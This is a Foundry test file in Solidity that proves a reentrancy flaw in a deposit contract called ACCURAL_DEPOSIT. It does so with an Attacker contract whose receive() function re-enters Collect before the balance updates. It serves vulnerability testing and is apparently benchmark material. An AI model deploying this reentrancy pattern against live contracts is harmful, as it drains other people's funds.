
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT, LogFile} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    ACCURAL_DEPOSIT public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new ACCURAL_DEPOSIT();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // Constraints
        // MinSum is 1 ether, so attackVal must be at least 1 ether to pass the check.
        vm.assume(attackVal >= 1 ether);
        // Limit upper bound to avoid overflow in setup calculations.
        vm.assume(attackVal < type(uint128).max);

        // Funding
        // We need to fund the attacker with enough ETH to cover TWO withdrawals.
        // Since Solidity 0.8.x protects against underflow, we cannot drain more than we have.
        // However, we can prove Reentrancy exists by successfully calling Collect twice 
        // before the balance is updated, which requires having enough balance to satisfy the math eventually.
        uint256 depositAmount = attackVal * 2;
        
        vm.deal(address(this), depositAmount);

        // Trigger Attack
        _attacker.setupAttack{value: depositAmount}(attackVal);
        _attacker.attack(attackVal);

        // Verify Success
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = ACCURAL_DEPOSIT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds to pass the balance checks in Collect
        _victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        attackCallCount = 1;
        
        // Call the vulnerable function
        _victim.Collect(val);
        
        // Verify if reentrancy occurred
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            _victim.Collect(storedAttackVal);
        }
    }
}
